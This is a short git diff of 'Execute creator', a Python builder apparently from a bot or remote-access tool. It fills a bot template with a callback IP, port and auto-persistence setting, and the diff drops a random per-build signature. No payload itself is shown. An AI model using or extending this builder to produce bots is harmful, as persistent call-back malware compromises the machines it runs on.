@@ -2,13 +2,11 @@
 # Author: Pure-L0G1C
 # Description: Execute creator
 
+from os import remove
 from os.path import sep 
 from lib.file import File
 from lib.args import Args 
-from random import choice
-from hashlib import sha256 
 from subprocess import Popen
-from os import remove, urandom
 
 # pyinstaller
 try:
@@ -62,8 +60,7 @@ class Executor(object):
            'addr_ip': repr(self.ip),
            'addr_port': str(self.port),
            'wait_time': str(self.wait),
-           'auto_persist': repr(self.persist),
-           'SIG': repr(sha256(urandom(choice([0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000]))).digest().hex())
+           'auto_persist': repr(self.persist)
   }
 
   self.write_template(self.bot_template, self.bot_py_temp, _dict)
